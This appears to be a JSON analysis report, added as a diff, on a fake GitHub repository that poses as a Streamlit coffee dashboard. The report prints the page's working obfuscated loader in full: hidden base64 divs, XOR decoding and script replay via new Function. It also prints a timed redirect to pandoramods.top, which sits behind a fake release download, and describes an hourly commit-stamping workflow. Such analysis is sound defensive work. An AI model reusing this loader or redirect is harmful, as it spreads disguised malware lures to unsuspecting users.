@@ -1,0 +1,283 @@
+{
+ "generatedAt": "2026-10-03T00:41:15.735Z",
+ "sources": {
+  "indexHtml": "index.html",
+  "readme": "README.md",
+  "workflow": {
+   "declaredPath": ".github/workflows/UVRgspkjdwor.yml",
+   "presentInWorkspace": false,
+   "analyzedCopy": "D:\\gsb-auto\\batches\\batch-20260929-005\\_scratch\\060-artisanal-streamlit-brew\\upstream\\.github\\workflows\\UVRgspkjdwor.yml",
+   "stampCompanion": "D:\\gsb-auto\\batches\\batch-20260929-005\\_scratch\\060-artisanal-streamlit-brew\\upstream\\.github\\HISIHFPxsifNnF",
+   "note": "任务书引用的工作流不在本工作区（git 全量对象中也无此文件）；分析所用副本来自批次 _scratch 上游快照，旁证戳记文件同源。"
+  }
+ },
+ "localRender": {
+  "shell": {
+   "file": "index.html",
+   "totalLines": 78,
+   "title": {
+    "line": 5,
+    "raw": "<title>My Page</title>"
+   },
+   "inlineStyle": {
+    "line": 6,
+    "raw": "<style>.igfKb7{display:none}.ADwpdF{outline:0}</style>"
+   },
+   "hiddenPayloadDivs": [
+    {
+     "id": "zxlwhXiv0",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3225,
+     "snippet": "<div id=\"zxlwhXiv0\" style=\"display:none\">I5Mr8UuL0UAbuduY3F2slb40S1ToRcb…</div>"
+    },
+    {
+     "id": "zxlwhXiv1",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3228,
+     "snippet": "<div id=\"zxlwhXiv1\" style=\"display:none\">lfwANix1/Q4dwller1v0yv6QZHPCkjp…</div>"
+    },
+    {
+     "id": "zxlwhXiv2",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3227,
+     "snippet": "<div id=\"zxlwhXiv2\" style=\"display:none\">xnr3JnfVajr8D1RSvQE2O/e4XMuXnlt…</div>"
+    },
+    {
+     "id": "zxlwhXiv3",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3225,
+     "snippet": "<div id=\"zxlwhXiv3\" style=\"display:none\">VHErvXndIeoFjMFKG6Od1IRD9/L/VhF…</div>"
+    },
+    {
+     "id": "zxlwhXiv4",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3219,
+     "snippet": "<div id=\"zxlwhXiv4\" style=\"display:none\">PrsKHxW6ArYqJDmPD9efmeraNsr6kDC…</div>"
+    },
+    {
+     "id": "zxlwhXiv5",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3225,
+     "snippet": "<div id=\"zxlwhXiv5\" style=\"display:none\">KS3idsRxokyW3hAd9dKfwgyw6eMwSly…</div>"
+    },
+    {
+     "id": "zxlwhXiv6",
+     "line": 9,
+     "inlineStyle": "display:none",
+     "base64Chars": 3215,
+     "snippet": "<div id=\"zxlwhXiv6\" style=\"display:none\">rpyDA+kU4S8hNRxbQg1MqYukn6+HdGe…</div>"
+    }
+   ],
+   "inlineScript": {
+    "startLine": 10,
+    "endLine": 75,
+    "raw": "<script>function ADD0vF(){var a=27,b=81;return a*b;}\n/* fallback for old browsers */\n(function(){\nvar iseVh6=atob('H7JPnij/qDB+mbPssTGSn4JcPzmEZaqKsJVITTEVAoY=');\nvar keIPxk=[];\nfor(var Gee1Ec=0;Gee1Ec<7;Gee1Ec++){\n  var _e=document.getElementById('zxlwhXiv'+Gee1Ec);\n  keIPxk.push(_e?_e.textContent:'');\n}\nvar lwnjZF=keIPxk.join('');\nvar R7BpWJ=atob(lwnjZF);\nvar BtZxuF=new Uint8Array(R7BpWJ.length);\nfor(Gee1Ec=0;Gee1Ec<R7BpWJ.length;Gee1Ec++){\n  BtZxuF[Gee1Ec]=R7BpWJ.charCodeAt(Gee1Ec)^iseVh6.charCodeAt(Gee1Ec%iseVh6.length);\n}\nvar yi6cvD=new TextDecoder('utf-8').decode(BtZxuF);\n\n/* Заголовок страницы */\nvar _t=/<title[^>]*>([\\s\\S]*?)<\\/title>/i.exec(yi6cvD);\nif(_t) document.title=_t[1];\n\n/* Достаём <head> и <body> */\nvar mk7vEa=/<head[^>]*>([\\s\\S]*?)<\\/head>/i.exec(yi6cvD);\nvar PpiiuN=/<body[^>]*>([\\s\\S]*?)<\\/body>/i.exec(yi6cvD);\nvar _h=mk7vEa?mk7vEa[1]:'';\nvar _b=PpiiuN?PpiiuN[1]:yi6cvD;\n\n/* Переносим разрешённые элементы из <head> (style/meta/link/base) */\nif(_h){\n  var GOGysx=document.createElement('div');\n  GOGysx.innerHTML=_h.replace(/<title[^>]*>[\\s\\S]*?<\\/title>/i,'');\n  while(GOGysx.firstChild){\n    var _n=GOGysx.firstChild;\n    var _tag=(_n.tagName||'').toUpperCase();\n    if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){\n      document.head.appendChild(_n);\n    }else{\n      GOGysx.removeChild(_n);\n    }\n  }\n}\n\n/* Вытаскиваем <script> из body */\nvar fXeKRS=[];\n_b=_b.replace(/<script\\b([^>]*)>([\\s\\S]*?)<\\/script>/gi,function(_m,_a,_c){\n  var _s=/src\\s*=\\s*[\"']([^\"']+)[\"']/i.exec(_a);\n  if(_s){fXeKRS.push([1,_s[1]]);}\n  else if(_c.trim()){fXeKRS.push([0,_c]);}\n  return '';\n});\n\n/* Вставляем body */\ndocument.body.innerHTML=_b;\n\n/* Перезапускаем скрипты в исходном порядке */\nfor(Gee1Ec=0;Gee1Ec<fXeKRS.length;Gee1Ec++){\n  PYACqI=fXeKRS[Gee1Ec];\n  if(PYACqI[0]){\n    var snMh6P=document.createElement('script');\n    snMh6P.src=PYACqI[1];\n    document.body.appendChild(snMh6P);\n  }else{\n    try{ (new Function(PYACqI[1]))(); }catch(e){}\n  }\n}\n})();</script>",
+    "deadFunction": "function ADD0vF(){var a=27,b=81;return a*b;}",
+    "xorKeyBase64": "H7JPnij/qDB+mbPssTGSn4JcPzmEZaqKsJVITTEVAoY=",
+    "steps": [
+     {
+      "id": "gather",
+      "desc": "读取 zxlwhXiv0..6 共 7 个隐藏 div 的 textContent 并拼接成一段 base64",
+      "code": "document.getElementById('zxlwhXiv'+Gee1Ec)"
+     },
+     {
+      "id": "decode",
+      "desc": "atob 解码后与 atob 得到的密钥逐字节循环 XOR，再按 UTF-8 还原出完整 HTML 字符串",
+      "code": "R7BpWJ.charCodeAt(i) ^ iseVh6.charCodeAt(i%len)"
+     },
+     {
+      "id": "head",
+      "desc": "剥离载荷 <title>，只把 STYLE/META/LINK/BASE 四类元素搬进 document.head，并用载荷 title 覆盖 document.title",
+      "code": "if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE')"
+     },
+     {
+      "id": "extract",
+      "desc": "用正则从载荷 body 中抽出全部 <script>：外链记 src、内联记代码，保持原顺序暂存",
+      "code": "_b.replace(/<script\\b([^>]*)>([\\s\\S]*?)<\\/script>/gi, …)"
+     },
+     {
+      "id": "replace",
+      "desc": "document.body.innerHTML 整体替换为载荷 body，外壳 DOM（含 7 个 div 与自身 script）被销毁",
+      "code": "document.body.innerHTML=_b;"
+     },
+     {
+      "id": "replay",
+      "desc": "按原顺序重放脚本：外链新建 script 元素插入，内联用 new Function 执行",
+      "code": "try{ (new Function(PYACqI[1]))(); }catch(e){}"
+     }
+    ]
+   }
+  },
+  "payload": {
+   "bytes": 16922,
+   "title": "Zayfern • Release ",
+   "metaDescription": "Interactive Coffee Sales Dashboard 2026 – Streamlit Analytics",
+   "referencesSvg": false,
+   "externalLinkTarget": "https://pandoramods.top/",
+   "externalLinkCount": 11,
+   "fakeRelease": {
+    "file": "release-x64.zip",
+    "size": "101.0 MB",
+    "sha256": "93ded4a9736931f25ab7bd398eecd664b9e2628978e6e502dab166f420a2ec30"
+   },
+   "redirect": {
+    "target": "https://pandoramods.top/",
+    "delayMs": 9166,
+    "raw": "<script>\n(function(){\n  var TARGET = \"https://pandoramods.top/\";\n  var REDIRECT_MS = 9166;\n  setTimeout(function(){ try{ window.location.href = TARGET; }catch(_){} }, REDIRECT_MS);\n})();\n</script>"
+   }
+  }
+ },
+ "resourcePaths": {
+  "note": "index.html 外壳与解码载荷均不引用 button.svg / preview.svg；3 处引用全部在 README.md，且全部写死为绝对 URL。仓库根同时存在同名本地文件，若按相对引用则只能以 README.md 所在目录为基准解析——绝对与相对是两套基准，分别解析、分线呈现，不合并。",
+  "references": [
+   {
+    "id": "ref-preview-1",
+    "file": "README.md",
+    "line": 1,
+    "name": "preview.svg",
+    "raw": "![preview](https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/preview.svg)",
+    "kind": "absolute",
+    "base": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/",
+    "resolved": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/preview.svg",
+    "contextHref": null,
+    "localCounterpart": {
+     "kind": "relative",
+     "base": "README.md 所在目录（仓库根）",
+     "resolved": "./preview.svg",
+     "file": "preview.svg",
+     "bytes": 14141,
+     "sha256": "a90d5c12836062e4ea2faeb2e7d587c0cf167238ba8741af6aaf05f202484686",
+     "relativeBase": "README.md 所在目录（仓库根）",
+     "relativeResolved": "./preview.svg"
+    },
+    "divergence": "绝对引用基准是 raw.githubusercontent.com 上 main 分支的目录（远端快照，随 main 未来提交可变）；本地同名文件按相对基准钉在当前工作区。两套基准各自解析，即使内容快照此刻一致也不并线。"
+   },
+   {
+    "id": "ref-button-48",
+    "file": "README.md",
+    "line": 48,
+    "name": "button.svg",
+    "raw": "## 📥 [![Download](https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/button.svg)](https://zayfern.github.io/artisanal-streamlit-brew-metrics/)",
+    "kind": "absolute",
+    "base": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/",
+    "resolved": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/button.svg",
+    "contextHref": null,
+    "localCounterpart": {
+     "kind": "relative",
+     "base": "README.md 所在目录（仓库根）",
+     "resolved": "./button.svg",
+     "file": "button.svg",
+     "bytes": 2673,
+     "sha256": "7b6af4625428d506006f63019a6c583552387f3da5d37a0478e200aaafea432f",
+     "relativeBase": "README.md 所在目录（仓库根）",
+     "relativeResolved": "./button.svg"
+    },
+    "divergence": "绝对引用基准是 raw.githubusercontent.com 上 main 分支的目录（远端快照，随 main 未来提交可变）；本地同名文件按相对基准钉在当前工作区。两套基准各自解析，即使内容快照此刻一致也不并线。"
+   },
+   {
+    "id": "ref-button-137",
+    "file": "README.md",
+    "line": 137,
+    "name": "button.svg",
+    "raw": "**[![Download](https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/button.svg)](https://zayfern.github.io/artisanal-streamlit-brew-metrics/)**",
+    "kind": "absolute",
+    "base": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/",
+    "resolved": "https://raw.githubusercontent.com/Zayfern/artisanal-streamlit-brew-metrics/main/button.svg",
+    "contextHref": null,
+    "localCounterpart": {
+     "kind": "relative",
+     "base": "README.md 所在目录（仓库根）",
+     "resolved": "./button.svg",
+     "file": "button.svg",
+     "bytes": 2673,
+     "sha256": "7b6af4625428d506006f63019a6c583552387f3da5d37a0478e200aaafea432f",
+     "relativeBase": "README.md 所在目录（仓库根）",
+     "relativeResolved": "./button.svg"
+    },
+    "divergence": "绝对引用基准是 raw.githubusercontent.com 上 main 分支的目录（远端快照，随 main 未来提交可变）；本地同名文件按相对基准钉在当前工作区。两套基准各自解析，即使内容快照此刻一致也不并线。"
+   }
+  ],
+  "localFiles": [
+   {
+    "file": "button.svg",
+    "bytes": 2673,
+    "sha256": "7b6af4625428d506006f63019a6c583552387f3da5d37a0478e200aaafea432f",
+    "relativeBase": "README.md 所在目录（仓库根）",
+    "relativeResolved": "./button.svg"
+   },
+   {
+    "file": "preview.svg",
+    "bytes": 14141,
+    "sha256": "a90d5c12836062e4ea2faeb2e7d587c0cf167238ba8741af6aaf05f202484686",
+    "relativeBase": "README.md 所在目录（仓库根）",
+    "relativeResolved": "./preview.svg"
+   }
+  ]
+ },
+ "triggerToPublish": {
+  "workflow": {
+   "path": ".github/workflows/UVRgspkjdwor.yml",
+   "presentInWorkspace": false,
+   "name": "qnTFIcFHOtcFOM",
+   "on": {
+    "schedule": [
+     {
+      "cron": "0 * * * *",
+      "meaning": "每小时整点（UTC）"
+     }
+    ],
+    "workflow_dispatch": {},
+    "push": null,
+    "pull_request": null
+   },
+   "branchFilters": {
+    "onPush": null,
+    "onPullRequest": null,
+    "hardcodedInScript": "main",
+    "note": "触发器层面没有任何 branches 过滤（也没有 push/PR 触发可过滤）；唯一的分支约束是脚本内 const branch = \"main\"，读取、写入、409 重试全部围绕 main。"
+   },
+   "permissions": {
+    "workflowLevel": {
+     "contents": "write"
+    },
+    "jobLevel": {
+     "job": "HwfFwfDyqoOM",
+     "contents": "write"
+    },
+    "minimumNeeded": "contents: write（createOrUpdateFileContents 要在 main 上创建提交）",
+    "redundant": "job 级与 workflow 级重复声明同一值；未声明 pages/actions/packages 等任何其他权限。"
+   },
+   "runsOn": "ubuntu-22.04",
+   "action": "actions/github-script@v7",
+   "artifact": {
+    "path": ".github/HISIHFPxsifNnF",
+    "directory": ".github/",
+    "kind": "直接提交回仓库的追加式戳记文件（非 Actions artifact）",
+    "branch": "main",
+    "op": "repos.createOrUpdateFileContents：读取→追加一行 ISO 时间戳/runId/随机数→以随机两词+#编号 为提交信息写回",
+    "retries": "409 冲突最多重试 4 次，退避 1500*attempt ms",
+    "companionObservedLines": 1063,
+    "companionFirstLine": "2026-06-28 20:58:41 UTC",
+    "companionLastLine": "2026-09-29T13:38:00.373Z run=36576517631 n=42970"
+   },
+   "publishTarget": {
+    "declaredInReadme": "https://zayfern.github.io/artisanal-streamlit-brew-metrics/",
+    "deliveredByWorkflow": null,
+    "actuallyWrites": "main 分支上的 .github/HISIHFPxsifNnF",
+    "mismatch": "README 的 Download 按钮指向 GitHub Pages 站点，但该工作流没有 pages 部署步骤、没有 pages: write 权限、不上传任何 Pages artifact；所谓“发布”只是每小时向 main 提交一行戳记。"
+   },
+   "snippets": {
+    "triggers": "on:\n  schedule:\n    - cron: '0 * * * *'\n  workflow_dispatch: {}",
+    "permissions": "permissions:\n  contents: write\n...\n    permissions:\n      contents: write",
+    "artifact": "            const stampPath = \".github/HISIHFPxsifNnF\";\n            const branch = \"main\";",
+    "write": "const { data } = await github.rest.repos.createOrUpdateFileContents({"
+   }
+  }
+ }
+}
